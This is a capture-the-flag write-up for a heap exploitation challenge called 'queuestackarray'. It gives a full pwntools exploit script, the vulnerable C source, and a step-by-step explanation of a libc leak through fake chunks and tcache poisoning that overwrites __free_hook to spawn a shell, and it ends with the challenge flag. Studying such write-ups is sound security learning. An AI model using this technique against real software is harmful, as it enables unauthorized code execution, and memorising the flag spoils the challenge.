# Queuestackarray
## solves: 12

In this problem gives the C source for the server that you have to pwn, and the compiled binary (although you dont actually need to binary it speeds up testing and makes it much easier).

## TL;DR:
```python
from pwn import *;

io = remote("queuestackarray.hsctf.com", 1337);

def malloc(direction, index, data):
    cmd = "push" + direction * int(direction == "left");
    io.recvuntil(b"> ");
    io.sendline((cmd+str(index)+" ").encode()+data);

def free(direction, index):
    cmd = "pop" + direction * int(direction == "right");
    io.recvuntil(b"> ");
    io.sendline((cmd+str(index)).encode());

def view(index, subindex):
    io.recvuntil(b"> ");
    io.sendline(("examine"+str(index)+str(subindex)).encode());
    return io.recvuntil(b'\n')[:-1];

for i in range(7):
    malloc("left", 2, b'Z' * 0x08 + b'\x91');
    malloc("left", 2, b'I' * 0x09);
    for j in range(0x10):
        malloc("left", 1, b'D');
    free("left", 2);
    free("left", 2);
    malloc("right", 1, b'S');

malloc("left", 2, b'Y' * 0x08 + b'\x91');
malloc("left", 2, b'Y' * 0x09);
for i in range(0x10):
    malloc("left", 1, b'\x91' * 9);

free("left", 2);
leak = u64(view(1, 7)+b"\x00\x00");

# 9.0
#hook, system, base = 0x1eeb28, 0x55410, leak - 0x1ebbe0
# 9.7
#hook, system, base = 0x1eee48, 0x522c0, leak - 0x1ecbe0
# 9.9
hook, system, base = 0x1eee48, 0x52290, leak - 0x1ecbe0

print(hex(base));
print(hex(base + hook));
print(hex(base + system));

for i in range(7):
    malloc("right", 1, b'');
    
malloc("left", 4, b'Z' * 0x8 + b'\x41');
malloc("left", 4, b'I' * (0x8 + 1));
malloc("right", 2, b'');
malloc("right", 2, b'');

for i in range(0x10):
    malloc("left", 3, b'1' * 0x40);
free("left", 4);

free("right", 2);
free("right", 2);
malloc("right", 3, b'A' * 0x30 + p64(base+hook).replace(b'\x00', b''));
malloc("right", 3, b'\xff'*6);
malloc("right", 3, p64(base+system).replace(b'\x00', b''));
malloc("right", 1, b"/bin/sh");
free("right", 1);

io.interactive();
```

The program allocated 4 queuestack structures in an array and allowed you to call pushleft, pushright, popleft, or popright on the queues.
```c
typedef struct Queuestack {
  char* cards[6];
  int head, tail;
} Queuestack;

void popleft(Queuestack* q) {
  if (q->head == q->tail) {
    puts("Queuestack is empty");
    return;
  }
  free(q->cards[q->head % 6]);
  q->head++;
}

void popright(Queuestack* q) {
  if (q->head == q->tail) {
    puts("Queuestack is empty");
    return;
  }
  free(q->cards[(q->tail-1) % 6]);
  q->tail--;
}


void pushleft(Queuestack* q, char* content) {
  if (q->tail - q->head >= 6) {
    popright(q);
  }
  int len = strlen(content);
  char* card = malloc(len+1);
  q->cards[(q->head - 1) % 6] = card;
  q->head--;
  strncpy(card, content, len);
  card[len] = '\0';
}

void pushright(Queuestack* q, char* content) {
  if (q->tail - q->head >= 6) {
    popleft(q);
  }
  int len = strlen(content);
  char* card = malloc(len+1);
  q->cards[(q->tail) % 6] = card;
  q->tail++;
  strncpy(card, content, len);
  card[len] = '\0';
}

/* --- snip --- */

} else if (strncmp(token, "examine", 7) == 0) {
    int num = token[7] - '1';
    int ind = token[8] - '1';
    if (num < 0 || num > 3 || ind < 0 || ind > 6) {
    puts("Queuestack number invalid (try pop1)");
    continue;
    }
    puts(queuestacks[num]->cards[ind]);
}

/* --- snip --- */
```
Their program contains two bugs:
1. `pushleft` function decrements the head index, and this can be used to overwrite parts of the previous queues because in C negative number modulo a number are still negative.
2. improper bounds checking in the `examine` function allows you to read one index past the end of the pointers array in each struct.
The stucture of the queues looked something like this:
```
| 6 * 8   | 4    | 4    | 8       | 6 * 8    | 4    | 4    | 8       |
| pointers| head | tail | padding | pointers | head | tail | padding | -> more queues
```
So if the head pointer of queue n is set to -2, the head and tail indices of queue n-1 are overwritten with a pointer to the heap. Then `pushleft` can be used to decrement queue n-1 head index, which is now the lower 4 bytes of a pointer to the heap.
This technically gives us arbitrary read and limited write, because we can modify the pointer to point to anything.

For arbitrary read: modify the pointer to point to the address you want to read, then examine the pointer abusing the fact that you can `examine` 1 past the end of the array which is where our pointer lies.
For a limited write: modify the pointer to point to the address you want to write to, free that pointer, then malloc again to write into that pointer. This is limited because:
1. pointer isnt 16 bytes aligned free will abort
2. if data before the pointer does not describe a valid heap chunk free will abort
3. the input is copied into the chunk using strncpy, which means we cannot write payloads with null bytes in the middle

I thought of many different possible ways of breaking this challenge, but the one I finally decided was possible was to free 7 chunks larger than the fastbin size (160 bytes on 64 bit systems) to fill the tcache, then free an eight chunk which places a pointer to `main_arena` into the chunk which we can then leak using `examine`. This gives us a libc leak because `main_arena` lives at a fixed offset into the libc.

The issue with this approach is that the largest chunk the program can allocate is around 70 bytes, which is less than the fastbin size. We need to free chunks larger than the fastbin size. To get around this, we create and free 8 fake chunks inside of chunks we own.

The layout of a malloced chunk on 64 bit systems looks like this:
```
| 8                      | 8                     | n         |
| size of previous chunk | size of current chunk | user data |
```
malloc returns a pointer to the user data and when a chunk is freed it checks the metadata the comes before the pointer. We can create a fake chunk that is larger than the fastbin size with this layout:
```
| 16                            | 8                   | 8               |
| real `malloc`d chunk metadata | fake chunk prevsize | fake chunk size |
```
Then malloc another chunk and make sure the pointer to that chunk overwrites the head/tail indices of a queue. The use the `pushleft` function on the pointer to decrement it until it points to our fake chunk and free the chunk. Repeat this process 7 times to fill the tcache, then one last time and examine the chunk to read the address of main arena.

```python
for i in range(7):
    malloc("left", 2, b'Z' * 0x08 + b'\x91'); # set index to -1, create fake chunk with size 0x91
    malloc("left", 2, b'I' * 0x09);           # set index to -2, overwrite head/tail of previous queue
    for j in range(0x10):
        malloc("left", 1, b'');               # decrement pointer to point to fake chunk
    free("left", 2);                          # set index to -1, free fake chunk
    free("left", 2);                          # set index to 0, free chunk
    malloc("right", 1, b'S');                 # malloc once more to make sure tcache is empty

malloc("left", 2, b'Y' * 0x08 + b'\x91');     # perform process once last time
malloc("left", 2, b'Y' * 0x09);
for i in range(0x10):
    malloc("left", 1, b'\x91' * 9);

free("left", 2);
leak = u64(view(1, 7)+b"\x00\x00");           # libc leak!
```

Now that we have to address of libc, the simplest way (that I could think of) to grab a shell would be to overwrite `__free_hook` to `system` then free a chunk with `"/bin/sh"`. In order write the address of system into `__free_hook`, we setup up 2 chunks and overlap them so one chunk is contained inside of another.

The tcache (introduced in glibc 2.26) is a collection of 64 singly linked list in LIFO order. Each bin holds a maximum of 7 chunks of a specific size. The bins start at size When a chunk is freed it is appended to the head of the linked list, and when a chunk is removed from the linked list it sets the linked list head to the removed chunks forward pointer.

In order to achieve our write to the `__free_hook` function pointer we free a chunk that is overlapping with another chunk. We free the first chunk, then write into the second chunk to overwrite the freed chunks forward pointer, malloc to place our target address at the head of the tcache bin, and once more to force malloc to return a pointer to `__free_hook` and allows us to write `system` into it.

```python
malloc("left", 4, b'Z' * 0x8 + b'\x41'); # fake chunk with size 0x41
malloc("left", 4, b'I' * (0x8 + 1));
malloc("right", 2, b'');                 # target chunk to overwrite fd pointer
malloc("right", 2, b'');                 # dummy chunk to free before target chunk

for i in range(0x10):
    malloc("left", 3, b'1' * 0x40);
free("left", 4);                        # free fake chunk

free("right", 2);                       # free dummy chunk
free("right", 2);                       # free target chunk, fd -> dummy chunk
                                        # write to overlapping chunk, fd -> __free_hook
malloc("right", 3, b'A' * 0x30 + p64(base+hook).replace(b'\x00', b''));
malloc("right", 3, b'\xff'*6);          # place pointer to __free_hook at head of tcache bin
                                        # overwrite __free_hook with system
malloc("right", 3, p64(base+system).replace(b'\x00', b''));
malloc("right", 1, b"/bin/sh");         # create chunk with "/bin/sh"
free("right", 1);                       # free("/bin/sh") -> system("/bin/sh")

io.interactive();                       # shell!
```

## Flag: flag{y0u_h4v3_4_f33l1n6_175_601n6_70_b3_4_l0n6_d4y_4c699247}
Yes, yes I do.

This challenge was really fun and actually my first successful heap chall, I learned about a tool called `patchelf` which you can use to set the libc of a binary to the version to want, given you have the actual libc. Also `gef` which is a gdb extension that adds many different useful commands that makes the process much easier. The part that actually caused me the most grief was figuring out the goddamn libc version and acquiring the correct offsets.